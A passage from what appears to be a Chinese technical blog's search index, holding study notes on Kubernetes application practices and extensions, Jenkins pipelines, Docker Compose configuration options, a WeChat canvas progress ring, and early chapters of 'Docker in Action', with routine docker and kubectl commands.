中设计了何种优雅的关闭机制，它都无法保证和控制它所在的节点突然出现的崩溃；此时会导致它的任何优雅关闭流程被强行终止；针对这个悖论的解决办法是另辟蹊径，即通过长期或定期运行一个 job，检查有没有出现一些孤立的资源（说明其所有节点可能已经崩溃了），如果有的话，就把它们安置到妥善的地方去； 确保所有的客户端请求都得到了妥善处理在 pod 启动时避免客户端连接断开解决方案：在 pod 声明文件中添加一个就绪指针，探测 pod 就绪成功后，再对外提供服务； 在 pod 关闭时避免客户端连接断开API 服务器在收到停止并删除某个 pod 的请求后，会同时做两件事情，一件是通知 endpoint 管理器更新转发规则，一件是通知 kubelet 删除 pod；前一个动作需要较长的执行时间（因为需要多个 endpoint 的 iptables 转发规则），后一个动作所需要的执行时间比较短，因此，后者大概率会以更快的速度完成；这会产生一个问题，即 pod 已经停止工作了，但是可能仍有请求被转发了进来，导致这些请求无法被正确处理； 以上问题并没有百分百的解决办法，唯一的办法是延长 pod 关闭时的等待时间，多几秒钟即可，例如 5-10 秒；这可以通过添加一个停止前的钩子，让容器睡眠一段时间来解决； 让应用在 Kubernetes 中方便运行和管理构建可管理的容器镜像冲突点：生产环境使用的镜像应该尽可能的小，这样可以缩短节点上镜像的下载时间，让 pod 更快的进入准备就绪的状态；而开发环境使用的镜像应该大一些，尽量包括一些方便在开发过程中进行调试的工具，例如 ping、curl、dig 等； 合理地给镜像打标签避免使用 latest 作为标签，因为无法通过这个标签知道当前 pod 运行的是那个版本的镜像，表面上它们的标签都一样，但实际上有一些可能是使用新镜像，一些使用的是旧镜像； 资源使用多维度而不是单维度的标签资源常见的标签维度： 资源所属的应用名称； 应用层级，例如前端、后端等； 运行环境，例如开发、测试、生产等； 版本号； 发布类型，例如稳定版、beta 版等； 分片，如果存在分片的话； 租户，如果存在租户的话（貌似还可以使用命名空间）； 通过注解描述每个资源注解可以给资源增加一些额外的信息，方便其他人更好的管理；一般有两个常用的注解，一个是关于资源负责人信息，一个是关于资源的描述； 其他类型的注解： pod 所依赖的服务：用来展示 pod 之间的依赖关系； 构建和版本信息； 第三方工具或图形界面可能要用到的元信息； 给进程终止提供更多的信息当容器挂掉后，需要调查挂掉的原因；为了让这个事情更便利，Kubernetes 提供了一个终止专用的日志文件 &#x2F;etc&#x2F;termination-log；当进程发生失败时，可以将消息写入这个文件，这样在调查原因时，可以通过 describe 查看到这个日志文件里面的内容； 我们并不知道容器中的应用何时会因意外终止退出，因此貌似可以通过捕捉错误，并将错误写入集中式的日志，以便后续进行错误的定位和排查； 处理应用日志在开发环境中，容器中的应用正常应将日志输出到标准输出，这样可以使用 logs 命令方便的进行查看；但如果是写到文件中，则需要使用 exec cat 命令进行查看； 在生产环境中，则使用一个集中式的日志管理器（不然崩溃的 pod 被删除后，pod 上面的日志也会跟着消失），它一般会部署在某个 pod 上，统一接收所有的日志消息；一个常见的解决方案是使用 EFK 栈，它们是三个工具，一个负责收集（FluentID）、一个存储（ElasticSearch)、一个展示（Kibana)； 开发和测试的最佳实践开发过程中在 Kubernetes 之外运行应用Kubernetes 要求将应用打包成镜像之后才能执行它，但这样显然不利于提高开发效率；如果应用的运行需要用到 Kubernetes 的某些功能，则可以模拟出来；API 服务器对于集群内和集群外的请求都是透明的，对它们一视同仁； 貌似唯一需要模拟的是 configMap 和 secret，其他的部分好像跟运行 docker-compose 没有特别大的差别； 在开发过程中使用 Minikube可以使用 Minikube 来模拟集群，同时通过 minikube mount 的功能，将本地文件夹挂载到 minikube 虚拟机中，然后再通过 hostPath 载挂载到容器中，这样就可以让本地文件的更改，实时的传递到容器中了； 在 shell 中设置 DOCKER_HOST 变量，让 dockers daemon 指向 minikube 虚拟机中的 docker daemon 后，则可以通过本地的 docker 命令来实现对虚拟内的 docker操作 将本地的镜像推送到 minikube 虚拟机中 发布版本和自动部署资源清单声明文件可以使用版本系统进行单独管理，每次提交更改后，就可以使用 apply 命令来更新当前的资源了； 甚至连手工的 apply 动作也可以进行自动后，可以采用第三方工具例如 kube-applier，它的作用有点像 github 的 webhook，当检测到有新提交的声明文件版本后，就会自动更新资源； 使用 Ksonnet 作为编写 YAML&#x2F;JSON 声明文件的额外选择Ksonnet 可以将声明文件模块化（使用 JSON 格式），然后通过组合共用的模块来减少编写重复的代码； 编写完成后，调用命令行进行转换 利用持续集成和持续交付可以参考 Fabric8 项目 http://fabric8.io 18. Kubernetes 应用扩展定义自定义对象自定义对象可以让集群的使用者站在更宏观的角度来使用集群，由更抽象的高级对象来实现业务需求，而不再直接与 Deployment、Secret、Service、Pod 等基础对象打交道；整个集群的管理和使用变得更加傻瓜化了； CustomResourceDefinitions 介绍简称 CRD，自定义资源应该至少由两部分构成，一个是该自定义资源对象的定义，另一个是资源的管理组件，这样当用户创建某个资源实例时，集群才能够调用该资源的管理组件，去做余下的工作（创建各种基础资源对象）； 定义好了后，就可以通过声明文件或者命令创建该种类型的资源了； 截止到这里，由于还没有创建控制器，因此实际上这些对象暂时还起不到任何实际的业务作用； 使用自定义控制器自动定制资源控制器应该至少做两个动作，一个是监控 API 服务器发出的事件通知，另一个是向 API 服务器提交请求，创建相应的资源； 当控制器启动后，它实际上并不是直接向 API 服务器发请求，而是通过当前 pod 中的 sidecar 容器 kubectl-proxy 来发送请求的，sidecar 充当了一个代理的作用； 控制器的本质其实很简单，它其实就是持续监听相关资源的事件，然后将原来手工操作的动作，转换成代码来实现；这些动作包括创建资源、删除资源、更新资源、查看资源等； 由于控制器本质上就是一个帮忙自动化干活的 pod，因此在部署到生产环境时，一般可以将它部署为 Deployment 资源，这样如果出现故障，可以自动恢复； 当实现了控制器的这些自动化的操作后，意味着可以将它们封装起来，对外隐藏复杂性，对于最终用户来说，他只要提供一个源代码的仓库链接，就可以快速的将网站部署起来，完全不需要了解关于 kubernetes 的任何知识；这样就可以构建 PaaS 服务了； 验证自定义对象如果让用户直接提交 YAML 文件来创建自定义的资源对象，会存在一个问题，即用户可能会提交无效的字段；因此集群在收到用户的资源创建请求时，有必要对其进行验证，确保 YAML 合法有效时，才进行创建；由于此时创建事件还没有发生，因此控制器无法完成验证的工作；因此需要由 API 服务器来完成（通过启用 CustomResourceValidation 特性来实现，在 1.8 以上版本中才有） 为自定义对象提供自定义 API 服务器除了使用 CustomResourceValidation 来验证请求的合法性外，还有另外一种更激进的办法，即自定义一个 API 服务器；当有了这个自定义的 API 服务器后，甚至连原本的 CRD 对象都不需要了，可以直接写到自定义的 API 服务器中；此时多个 API 服务器形成了一种聚合，对客户端来说是无感知的，客户端的请求将被分发到不同的 API 服务器进行处理； 原来以为多 API 服务器的实现将是一个很复杂的功能，后果发现原来 Kubernetes 有内置了一个 APIService 的资源（本质上就是将该某些自定义资源对象的请求转发到提供该 APIService 的 pod，并不复杂，转发规则为 API 组名+版本号），只要创建该类型的资源，就可以实现多个 API 服务器；主 API 服务器会根据请求的属性，将其转发到这些多出来的 API，由它们做进一步的处理（但是仍然不可避免需要提供此 APIService 的 pod 写上一段自动化的代码，即将原来 CRD 控制器的代码移到这里来了）； 除了可以自定义 API 服务器，还可以实现自定义 CLI 客户端，实现 Kubectl 不方便完成的更多自定义功能； 使用 Kubernetes 服务目录扩展 Kubernetes服务目录是指列出所有可用服务的目录，然后用户根据需要选择对应的服务即可，而不需要自己去创建各种基础资源（如 Deployment、Service 等），简化用户对 Kubernetes 的使用门槛； 服务目录介绍服务目录听上去很像是另外一种资源的抽象和封装，用户可以调用查看当前可用的服务目录，然后选择并创建某个服务；之后该服务会自动去创建各种基础资源，如 Deployment、Pod 等； 后来发现，它最大的作用并止于此，而是 Kuberbetes 可以跟集群进行协作；即有些云服务供应商，或者是内部的不同部门的团队，它们可以创建自己的 Kubernetes 集群，然后对外提供一些特定服务；其他集群的用户只要通过服务目录这个功能，来调用它们提供的服务即可，而无须在自己的集群上创建资源； 服务目录有四种内置的资源类型，分别为： ClusterServiceBroker ClusterServiceClass ServiceInstance ServiceBinding 运作流程 集群管理员为服务代理创建一个 ClusterServiceBroker 资源，对应一个外部的服务代理商； 集群通过该 Broker 资源，从服务代理商处获得它可以提供的服务列表，并为每种服务创建一个 ClusterServiceClass 资源； 当集群内的用户想要使用某种服务时，只须创建一个 ServiceInstance 实例，并创建一个 ServiceBinding 绑定该 instance；之后集群内的 pod 就可以访问该外部服务了； 服务目录 API 服务器与控制器管理器介绍服务目录跟集群一样，也有自己的 API 服务器、控制器管理器、etcd 数据库等三大件；通过这些组件，可以为外部其他集群的用户提供一些抽象后的高层级服务功能； 以上示意图是站在服务目录提供商集群的视角，实际的用户处于 External system； Service Broker 和 OpenServiceBroker API 当创建好 ClusterServiceBroker 后，集群就会根据资源中的 URL，去代理处请求得到相应的服务列表，之后自动创建相应的 SerivceClass 与之对应； 提供服务与使用服务当需要使用某个外部服务时，只须创建相应的 ServiceInstance 实例，并创建 ServiceBinding 与该实例进行绑定即可； 解除绑定与取消配置当不再需要服务时，通过删除服务实例和服务绑定即可取消； 12kubectl delete servicebinding &lt;my-postgres-db-binding-name&gt;kubectl delete serviceinstance &lt;my-postgres-db-name&gt; 基于 Kubernetes 搭建的平台由于 Kubernetes 方便拓展的特征，很多原本也研发 PaaS 平台的公司，也重新改写它们的产品，变成基于 Kubernetes 进行拓展； 红帽 OpenShift 容器平台Kubernetes 中的很多资源还是非常底层的，OpenShift 对它们进行了封装，提供了更多的抽象资源，并提供参数化的模板，让开发者的工作变得更加简单起来，完全无须了解 Kubernetes 的知识，也能够轻松使用完成部署和维护的工作； Deis Workfiow 与 Helm另外一个有名的 PaaS 产品是 Deis 的 Workfiow（已被微软收购），该团队还开发了一个 Helm 工具，用来简化部署的过程；目前 Helm 已成为社区中的部署标准工具； 仅有镜像是不足以创建应用的，还需要配合声明文件；但对于很多常见的应用来说，例如数据库应用，编写这它们的声明文件就变成了一件重复造轮子的工作，为了避免这个问题，发明了 Helm 这个工具，它将应用和声明文件绑在一起，称为包，然后再结合用户的自定义配置文件，即可以形成应用的发行版本；就像很多人会共享镜像文件一样，也有很多人会共享做好的 Helm 包，当我们需要用到某个通包的软件时，应该先找一下有没有将其做成了 Helm 包，如果有的话，直接拿过来用就可以了； 示例如下： OpenShift 本质上是一个基于 Kubernetes 开发的平台，它有自己优化后的 API 服务器和管理组件，因此，它并不能与用户的现在集群进行整合；而 Deis Workfiow 则可以部署到任何现有的 Kubernetes 集群中，因此 Workfiow 看起来更像是 Kubernetes 的一个插件，让集群的使用更加方便简单； Helm 是 Kubernetes 的一个包管理器，类似于 Ubuntu 里面的 apt，或者 CentOS 里面的 yum；它由两部分组成，一部分是客户端，用于接收和发送用户指令；另一部分则运行在 Kubernetes 集群中（以 pod 的形式存在，通过在集群中安装 Tiller 组件来实现），用来接收客户端发出的指令，并在集群中执行相应的动作； Helm 仓库地址：https://github.com/kubernetes/charts 使用 Helm 的流程： 在仓库中找到合适的图表，git clone 到本地 通过本地的 Helm 客户端，发送图表到集群中； 搞掂！ 19. 经验积累K8s 的本质感觉 Kubernetes 的本质就像一个部署的管理器，它可以将 YAML 所描述的抽象的资源，部署到集群中的机器上面去；这些抽象的资源包括应用、服务、任务、存储、管理器等；所有这些抽象的资源，都需要将它们镜像化和容器化；从而便资源的部署工作简化成创建和运行容器而已； GKE 工作方式对于 GKE，它自带一个客户端 gcloud 可用来实现集群层面的操作，包括创建、更新、删除集群等场景，增加和减少节点数量等；而集群内部的资源操作，则由 kubectl 处理； 管理集群 创建一个 config 文件； 访问 pod 的几种方法 在集群中创建一个 pod，在里面使用 curl 或者端口转发； 通过 API 服务器作为代理 运行命令： kubectl proxy，之后就可以通过代理 URL 来访问 pod 了； 直接访问的 URL：:&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;kubia-0&#x2F;proxy&#x2F;通过代理访问的 URL： localhost:8001&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;kubia-0&#x2F;proxy&#x2F;","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"Jenkins","slug":"Jenkins","date":"2020-03-31T03:45:00.000Z","updated":"2024-09-22T03:42:41.717Z","comments":true,"path":"2020/03/31/Jenkins/","permalink":"http://example.com/2020/03/31/Jenkins/","excerpt":"","text":"Jenkins 的本质，其实是将原来平时手工操作的测试、部署用脚本实现自动化，并提供了一个可视化的界面，来查看自动化操作之后的结果。它让很多常规的测试和部署工作在操作一次，后续可以重复使用，提高了开发效率； 流水线 pipeline pipeline 是一个不错的理念，它通过 DSL（支持声明式或脚本式两种风格），将前述的自动化操作，用代码的方式表达出来，这样让每个团队成员更容易阅读理解，并可以随着代码进行版本管理，实现跟实际代码版本的匹配，以及实现可追溯； 名称解释pipeline： 用来定义构建流程，包括构建、测试、部署等环节；node：节点，表示一台机器，是构建环境的组成部分，可用来执行 pipeline 代码；stage: 阶段，流水线任务中的不同阶段，例如构建阶段、测试阶段、部署阶段等；每个阶段由1到多个任务组成，step: 任务，用来告知 jenkins 在某个时点，应该做的操作，例如执行某个 shell 命令； 声明式 Pipeline 使用 Pipeline前提条件 Jenkins 2.x 以上版本； 已安装 Pipeline 插件； 定义 Pipeline有三种方法： 使用 Blue Ocean 插件； 使用 UI 界面； 在源代码中手写 Jenkinsfile 文件； 自动生成代码片段 创建 Pipeline 项目后，在项目主页的左侧，有一个 Pipeline Syntax 菜单项，可以用来学习如何写 Jenkinsfile； 使用全局变量 env params currentBuild 使用 Jenkinsfile将 Jenkinsfile 放入代码所在的文件夹，一同纳入版本管理后，当 git push 到 github 后，通过 github 的 webhook，会触发 Jenkins 的自动构建；之后 Jenkins 会从 github 摘取最新版本的代码，并按照 Jenkinsfile 中写法的 pipeline 内容自动进行构建、测试和部署等操作； 字符串def str &#x3D; “World” 注意需要使用双引号来包含字符串，因为只有双引号括起来的字符串，后续才可以使用美元符 $ 进行引用，例如: ${str} 环境变量 BUILD_ID BUILD_NUMBER BUILD_TAG BUILD_URL EXECUTOR_NUMBER JAVA_HOME JENKINS_URL JOB_NAME：项目名称 NODE_NAME：机器节点名称，例如 master WORKSPACE: WORKSPACE 绝对路径 环境变量通过 $ {env.变量名} 进行访问，例如：”${env.BUILD_ID}” 设置静态环境变量 设置动态环境变量调用 sh 执行命令，获取 returnStdout 或者 returnStatus 的返回结果，赋值给相应的变量； 处理机密信息文本、用户名、密码和机密文件声明式的 Pipeline 通过在 environment 指令中使用 credentials(“凭据ID”) 函数来读取在全局凭据中提前设置好的文本、用户名、密码、机密文件等机密信息，并赋值给相应的变量，以便后续阶段可用凭据 ID 进行调用； 处理参数使用 parameters 指令，可以在运行时接用户指定的参数； 处理失败通过在 post 代码块中，指定一些构建结束后要运行的操作； 使用多个 agents适用一些复杂的用例，例如构建后，在不同平台(linux\\windows)进行测试 可选的命令参数命令的参数可以不用括号，并直接指定参数名称； 以下两种格式都是可以的： 当命令只有一个参数时，则还可以省略参数名 高级的指令并行执行 使用 Docker当在 Jenkinsfile 中指定了镜像后，Jenkins 会自动创建基于该镜像的容器，并在容器中执行相应的指令； 容器数据缓存通过映射本地目录，可以存储容器中的数据 使用多个容器 使用 Dockerfile","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"运维","slug":"运维","permalink":"http://example.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"Docker-Compose","slug":"Docker-Compose","date":"2020-02-06T02:33:00.000Z","updated":"2024-09-22T03:44:20.631Z","comments":true,"path":"2020/02/06/Docker-Compose/","permalink":"http://example.com/2020/02/06/Docker-Compose/","excerpt":"","text":"新版本的 dockerfile 由五部分组成，分别是 services, volumes, network, configs, secrets，services 用来创建容器，其他四部分用于在容器间共享一些信息； services: 用来构建容器 build: 可以是一个字符串（指定 docker-compose.yml 文件的所在目录），也可以是一个对象 context：指定 docker-compose.yml 文件的所在目录； dockerfile：指定 dockerfile 相对于 context 的文件路径名； args: 指定构建的环境变量，这些变量可以被 dockerfile 中引用； 变量名：变量值（若不指定变量值，则构建时将从环境变量中查询该变量名对应的值） labels: 用来设置镜像的元数据 “属性名&#x3D;属性值” 注：此处的属性值若是域名，建议倒着写，即 docs.abc.com 写成 com.abc.docs，以避免跟某些软件的默认设置冲突； target：若 dockerfile 是多阶段构建，则该值可用来指定要构建的阶段； image：如有指定 build 选项，则此选项用来给镜像命名+标签；若没有指定 build 选项，此选项用来指定构建容器所要引用的镜像；选项值可以是镜像名+标签，或者镜像的ID cap_add 或 cap_drop：用来增加或减少容器系统调用权限；用于设置安全性的场景； cgroup：用来设置所属的资源控制组（资源控制组用来设置资源使用的权限） command：要执行的指令，若此处设置了，则会覆盖 dockerfile 中的设置值；该值可以是长字符串，也可以是字符串列表； container_name: 可用来自定义容器名；但当构建多个相同容器时，该选项会带来冲突； configs：用来设置配置项，它支持将配置值放在一个文件中，然后在此处设置访问的路径；该选项有简版和长版两种写法；详细查看此链接； depends_on：显示声明当前容器所依赖的其他容器；它会让 compose 在启动或停止容器时，按相互依赖的顺序进行；虽然控制了顺序，但这不意味着后面的容器会等前面的容器准备好再启动；所以，有时候可能不一定能够达到完美的预期效果； deploy：用来设置部署的方式，此选项仅在 swarm 模式下起作用，在 compose 模式下会被忽略； endpoint_mode：用来设置某个容器服务被集群外的客户端发现的方式； mode：部署的模式，单节点单容器，或者单节点多容器； replicas：副本数量（仅在 mode 为单节点多容器的情况下有效）； resources：设置资源使用的限制； restart_policy：重启策略； rollback_config：更新失败后的回滚策略； update_config：更新策略； devices：用来设置设备映射； dns：用来设置 DNS 服务器；可以是单个值，也可以是列表； entrypoint：入口点；设置后，会覆盖 dockerfile 里面的值； env_file：从文件中加载环境变量，可以单个值（单文件），也可以是列表（多文件）；文件中的键值对格式为：KEY&#x3D;value environment：用来设置环境变量； KEY: value expose：要暴露的端口；这些端口仅供已跟当前容器连接的其他容器访问，无法被主机访问； external_links：和那些不在当前 docker-compose.yml 文件定义的容器进行连接；不太推荐使用 links 这个遗留的历史功能，更推荐用 networks 来配置； 外部容器名：自定义别名 extra_hosts：添加外部主机的映射； “主机名:主机IP” healthcheck：可用来设置执行某个预定义的命令，进行容器的健康检查，确保容器有正常运行； links：该选项即将在弃用，建议使用 networks 进行配置； logging：配置日志选项； network_mode：设置网络连接模式，默认值是 bridge，其他值有 host, join, none等等； networks：用来设置当前容器所属的网络，相关信息定义在上一级的 Networks 条目下； 所属的网络名 aliases: 当前容器在网络中的别名； ports：设置端口映射；有短版和长短两种写法； restart：容器运行失败后的重启策略，默认是不重启； secrets：从文件中加载一些机密变量值； tmpfs：用来在容器中挂载一个或多个 tmpfs；写入 tmpfs 中的内容，将存储于内存中，而不是磁盘中； volumes：挂载某个主机上的文件夹，或者某个存储卷；如果想要在多个容器中共享数据，则在上一级的 Volumes 定义存储卷，然后在此处进行引用设置；这个选项也是有简版和长版两种写法； domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, tty, user, working_dir：功能同 docker 命令下相应的参数； volumes: 用来设置命名存储卷，以便在多个容器间共享； 存储卷名称 driver：要使用的驱动名称； driver_opts：驱动的配置参数； external: 若为 true，表示该存储卷已在当前 docker-compose.yml 文件外定义； labels：存储卷的元信息； name：存储卷名称； networks: 用来设置命令网络，以便多个容器间相互通讯； 网络名称 driver：网络驱动；单机默认为 bridge，集群默认为 overlay； driver_opts：驱动的配置参数； labels： 网络的元信息； external: 若为 true，表示网络已在当前 docker-compose.yml 文件外定义； name: 网络名称； configs: 用来设置让多个容器进行引用的配置项（来源于某个文件或者外部）； 配置项名称 file：文件路径 external：若为 true，表示已在当前 docker-compose.yml 文件外定义； name：配置项名称； secrets: 用来设置让多个容器进行引用的机密信息（来源于某个文件或者外部） 机密项名称 file：机密文件路径 external：若为 true，表示已在当前 docker-compose.yml 文件外定义； name：机密项名称；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"微信小程序进度环","slug":"微信小程序进度环","date":"2020-01-20T01:06:40.000Z","updated":"2024-09-21T23:12:39.768Z","comments":true,"path":"2020/01/20/微信小程序进度环/","permalink":"http://example.com/2020/01/20/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%BF%9B%E5%BA%A6%E7%8E%AF/","excerpt":"","text":"wx.createCanvasContext 的工作原理很像 JQuery 里面的选择器，通过 canvas-id 来选择 HTML 文件中相应的 canvas，然后对其进行相关操作实现绘图； demo 代码 github 链接：https://github.com/ccw1078/wx_progress_ring","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"Docker 实战","slug":"Docker 实战","date":"2020-01-02T02:26:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2020/01/02/Docker 实战/","permalink":"http://example.com/2020/01/02/Docker%20%E5%AE%9E%E6%88%98/","excerpt":"","text":"第1部分 保持一台整洁的机器第1章 欢迎来到 Docker 世界1.1 什么是 Docker当启动 Docker 的时候，它实际上是启动了一个父进程；当创建了某个容器时，它实际上创建了一个子进程；并且父进程会为这些子进程分配指定的内存空间和资源；每个子进程只能访问属于自己的内存空间和资源； Linux 内核通过命名空间和cgroups技术来实现资源隔离，而 Docker 正是利用内核的这项技术，进行二次封装，方便用户使用； 镜像本质上是一个容器中所有文件的一份快照；它可以做为模板，用来创建新容器； 1.2 Docker 解决了什么问题软件的构建往往需要很多依赖，以及一些环境变量的设置；不同的软件可能依赖不同的版本的模板；当软件越来越大或者越来越多时，事情变得非常复杂。Docker的目的在于，将不同软件的所有的这些问题进行隔离，当一个软件在容器中配置好自己的依赖和环境，就将它打包成一个镜像快照；后续需要使用该软件的人，只需复制这份快照即可；实现了一次配置，永久使用，这样可以大大简化软件的移植和部署问题； Docker可以原生的运行在 Linux 操作系统上面，因为它使用的即是Linux的命名空间技术；但对于 Win 和 Mac，它实际上需要先创建一个虚拟机，然后所有容器共用这个虚拟机；尽管如此，相对于以前的vmware硬件虚拟化技术，这种方法在开销和性能上，都取得了更大的进步； 1.3 Docker 的好处它让事情变得更加简单，让用户仅关心应用程序的核心部分，即如何使用它，而不需要去关心每个应用程序如何安装的问题； 1.4 Docker 不能做什么Docker 可以实现资源的有效隔离，但它仅靠自己并不能提高安全性，尤其是当容器的应用程序以很高的权限运行的时候；在使用容器的基础上，配合使用合理的权限管理设置，才能有效的提高安全性； 在容器中随意运行高权限的不受信任来源的程序，是一个危险的行为； 第2章 在容器中运行软件2.1 通过帮助了解如何使用 docker 命令12docker help # 查看所有可用的命令docker help cp # 查看单个命令 cp 的使用帮助 2.2 控制容器与容器进行交互使用 dokcer attach 可以将当前 shell 的输入和输出映射到容器中，这样就可以在当前 shell 中看到容器内的输出；同时，也可以将输入发送到容器中，实现需要的操作； 使用 ctrl+p 和 ctrl+q 两个输入，可以实现 deattach，即 attach 的反向操作，让shell和容器分离；同时不会停止容器的运行； 对容器进行连接实现访问通过 run 创建容器时，通过增加 –link 选项，可以让新容器和已经创建的容器进行关联，从而实现对已创建容器的访问； 查看容器的日志通过 docker logs &lt;容器名称&gt;，可以查看某个容器内的日志； 2.3 PID 命名空间docker 利用 linux 的 PID 命名空间机制来实现虚拟化；每个 PID 命名空间内的 PID 都是相互独立的，它们可以重复编号，而不会互相干扰；每新建一个容器，Docker 默认都会为它分配一个新的 PID 命名空间； 但是，通过 –pid host 选项，可以实现不新建命名空间，而使用跟当前进程相同的命名空间； 2.4 消除元数据冲突在创建容器的过程中，有时会产生命名冲突，为解决这个问题，可通过容器 ID 来进行管理；但 ID 是一种随机的字符串，无法提前预知；因此，需要通过变量或文件来获取该 ID 值，然后在随后使用，以实现自动化管理； 使用 docker create 可以创建一个未启动的容器，并获得其 ID； 使用变量管理容器的示例12345MAILER_CID = $(docker run -d dockerinaction/ch2_mailer)WEB_CID = $(docker create nginx)AGENT_CID = $(docker create --link $WEB_CID:insideweb \\ --link $MAILER_CID:insidemailer \\ dockerinaction/ch2_agent 从软件部署的角度来看，开发应用程序时，应该尽量减少对环境的信赖，这样可以提高程序的扩展性，并降低维护的复杂度； 2.5 构建与环境无关的系统2.5.1 只读文件系统创建只读容器的好处是可以防止出现有意或无意的破坏；同时，由于数据与程序分离，意味着当程序出现损坏时，可以快速再启动一个新的，而无需担心里面的数据恢复问题； 通过在 docker run 中使用 –read-only 选项，即可创建只读容器； 12345678910111213141516171819SQL_CID = $(docker create -e MYSQL_ROOT_PASSWORD=ch2demo mysql:5)docker start $SQL_CIDMAILER_CID = $(docker run -d dockerinaction/ch2_mailer)docker start $MAILER_CIDWP_CID = $(docker create --link $SQL_CID:mysql -p 80 \\ -v /run/lock/apache2/ -v /run/apaches/ \\ --read-only wordpress:4) docker start $WP_CIDAGENT_CID = $(docker create --link $WP_CID:insideweb \\ --link $MAILER_CID:insidemailer \\ dockerinaction/ch2_agent docker start $AGENT_CID 2.5.1 环境变量注入创建容器时，使用 –env 选项，可以为容器设置环境变量的值；而容器中的应用程序在运行时，可以依赖这些注入的环境变量； 脚本示例： 123456789101112131415161718192021222324252627282930DB_CID = $(docker create -e MYSQL_ROOT_PASSWORD=ch2demo mysql:5)docker start $DB_CIDMAILER_CID = $(docker run -d dockerinaction/ch2_mailer)docker start $MAILER_CIDif [! -n &quot;$CLIENT_CID&quot;]; then echo &quot;client id not set&quot; exit 1fiWP_CID = $(docker create \\ --link $DB_CID:mysql \\ --name wp_$CLIENT_ID \\ -p 80 \\ -v /run/lock/apache2/ -v /run/apaches/ \\ -e WORDPRESS_DB_NAME=$CLIENT_ID \\ --read-only wordpress:4) docker start $WP_CIDAGENT_CID = $(docker create \\ --name agent_$CLIENT_ID \\ --link $WP_CID:insideweb \\ --link $MAILER_CID:insidemailer \\ dockerinaction/ch2_agent docker start $AGENT_CID 2.6 建立持久化的容器容器内的程序如果出现一些意外错误，会导致容器进入退出的状态，对于需要持续提供服务的程序来说，这些情况是不允许的，因此需要有一个能够自动启动意外暂停容器的机制； 2.6.1 自动重启容器创建容器时，使用 –restart 选项，可以配置容器的自动重启策略； 这种策略的缺点是当容器退出并等待重启的期间，无法与容器进行交互； 2.6.2 使用 init 或 supervisor 维持容器的运行状态操作系统启动的第一个进程（init 进程，也即PID编号为1的进程），是所有其他进程的父进程；因此，可以利用这个机制，当某个进程意外退出时，可以使用这个 init 进程对其进行重新启动； 同时，还需要引入一个 supervisor 进程，避免因某个进程终止，导致容器退出，即实现容器的持久生命周期； 2.6.3 启动脚本相对于使用 init 和 supervisor，使用启动脚本可以带来更大的灵活性，例如在启动程序前，对相关的环境变量进行检查； 一般可以将启动脚本设置在容器的入口点中（所谓的入口点，用于在容器时，自动运行的命令或程序）； 2.7 容器清理docker stop 可用来停止容器的运行；只有当容器处于停止运行状态时，才可以使用 docker rm 进行删除； docker rm -f 选项可以用来强制删除；它的原理相当于先发送一个 docker kill 的命令，然后再执行 rm 的命令； 在创建容器的时候，通过增加 –rm 选项，可以使得容器在退出后，自动删除，这样可以减少手工进行删除的工作； docker rm -vf $(docker ps -a -q) 可以实现一条命令停止并删除当前所有正在运行的容器； 第3章 软件安装的简化3.1 选择所需的软件镜像本质上是一个文件集合，同时还有一些元信息；元信息中包含镜像的命令历史、暴露的接口、和其他镜像的关联、卷的定义等信息； 镜像有一个唯一的 ID，但这个 ID 非常不方便记忆，因此，一般使用“域名+用户名+镜像名”的方式来标识一个镜像； 同时再使用标签来标识镜像的各种不同版本； 事实上，域名+用户名+镜像名的方式，即组成了镜像的仓库地址；通过该地址，可以访问和下载镜像文件； 3.2 查找和安装软件3.2.1 命令行使用 docker hub一般通过索引库来查找所需要的镜像，Docker hub 是官方的索引库； 镜像文件可以使用命令行发布到 Docker hub 上，但这种方式并不安全，因为镜像的构建过程是不透明的；使用者无法保证镜像中所有文件的安全性； 另外一种方法是使用 dockerfile +官方构建引擎进行构建；这种方式的好处是保证了安全性，但是构建速度稍微慢一点； 通过 docker search &lt;镜像名&gt; 可以很方便的查询 docker hub 镜像仓库中的各种镜像；其中 Automated 标记为 OK 的镜像表示以公开脚本构建的，因此安全性更加有保障； 除了从 docker hub 官方仓库下载镜像外，也有其他的第三方仓库可以下载镜像，唯一的区别是域名不一样，以及可能需要登录验证； 3.2.2 镜像文件除了从网上镜像仓库下载镜像外，还可以通过导入事先导出的镜像文件，来获得镜像； 导出示例：docker save -o myfile.tar &lt;镜像名&gt;导入示例：docker load -i myfile.tar 3.2.3 从 Dockerfile 安装使用 dockerfile，运行 docker build -t &lt;镜像名&gt; &lt;dockerfile所在目录&gt;，也是一种构建镜像的方法；这种方法的缺点是需要较多的时间；因为可能要下载很多依赖文件； 3.3 安装文件和隔离3.3.1 容器实现隔离的机制Linux 通过 MNT Namespace（系统命名空间） 的机制，为不同的进程提供不同的视图；每个进程隶属于某个命名空间，并可以看到该命名空间中的其他进程，但看不到其他命名空间下的进程，这样就为进程实现了隔离； Union File System（联合文件系统）：它的工作机制有点像 Git，每次的修改像是创建一个新的分支，而不是去改动旧的文件；最终的结果则是所有历史分支的叠加结果；这样即使原始文件是只读的，也可以实现虚拟的可写； chroot 命令可以设置某个文件夹为某个进程的根文件夹，这样就可以为不同的进程虚拟出很多各自不同的根文件夹，从而可以辅助实现虚拟化和文件隔离； 3.3.2 分层文件机制的优点 